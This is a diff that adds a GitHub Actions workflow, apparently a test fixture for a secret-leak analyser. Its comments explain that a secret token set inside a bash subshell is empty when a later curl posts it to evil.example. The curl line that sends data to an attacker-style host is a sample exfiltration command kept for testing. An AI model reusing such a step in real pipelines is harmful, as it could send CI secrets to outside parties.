@@ -1,0 +1,17 @@
+# situation: on push, a step sets t to the secret TOKEN inside ( ... ), and
+#   after the ( ... ) sends t with curl to evil.example.
+# reason: bash runs ( ... ) in a subshell, so after the subshell t is empty,
+#   and curl sends nothing of the secret.
+# attack: the owner of evil.example reads what curl sends.
+# attack-run-behavior: curl sends an empty body.
+on: push
+permissions: {}
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          S: ${{ secrets.TOKEN }}
+        run: |
+          ( t=$S )
+          curl -d "$t" https://evil.example
